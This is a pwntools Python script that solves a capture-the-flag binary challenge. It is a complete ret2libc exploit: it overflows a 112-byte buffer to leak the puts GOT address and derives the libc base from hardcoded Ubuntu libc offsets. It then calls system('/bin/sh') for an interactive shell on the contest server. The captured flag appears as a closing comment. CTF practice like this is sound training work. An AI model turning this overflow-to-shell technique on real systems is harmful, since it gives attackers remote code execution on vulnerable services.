#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')

# Invoke with './solve.py [GDB|REMOTE|<nothing>]'
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('welcome_message.ctf.fifthdoma.in', 9999)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
set follow-fork-mode parent
break *0x804920d
continue
'''.format(**locals())

puts_plt = exe.plt['puts']
main_plt = exe.symbols['main']
puts_got = exe.got['puts']

io = start()
io.recvuntil(b"your name: ")

# leak GOT addr of puts, then return to main()
payload = b"A"*112 + p32(puts_plt) + p32(main_plt) + p32(puts_got)
io.sendline(payload)
received = io.recvline()
puts_got = received[:4].strip().ljust(4, b'\x00')
puts_got = u32(puts_got)
log.info("Got Puts GOT: " + str(hex(puts_got)))

# remote puts: 0xf7df7460
# remote system: 0xf7d51e10
# search https://libc.blukat.me with these to get libc version and offsets
# --> libc6-i386_2.27-3ubuntu1.4_amd64 

offset_str_bin_sh = 0x17b88f
offset_puts = 0x067460
offset_system = 0x03ce10

# Get libc base
libc_base = puts_got - offset_puts
log.info("Got libc base: " + str(hex(libc_base)))

# Get address of /bin/sh string and system()
bin_sh = libc_base + offset_str_bin_sh
system = libc_base + offset_system
log.info("Addr of /bin/sh: " + str(hex(bin_sh)))
log.info("Addr of system(): " + str(hex(system)))

# Get shell
payload = b"A"*112 + p32(0x804901f) + p32(system) + p32(main_plt) + p32(bin_sh) + b"\x00"*4
io.recvuntil(b"your name: ")
io.sendline(payload)
io.interactive()

# flag{w3lc0m3_gu3st5_Pwn1nG_15_alw4ys_c00l}
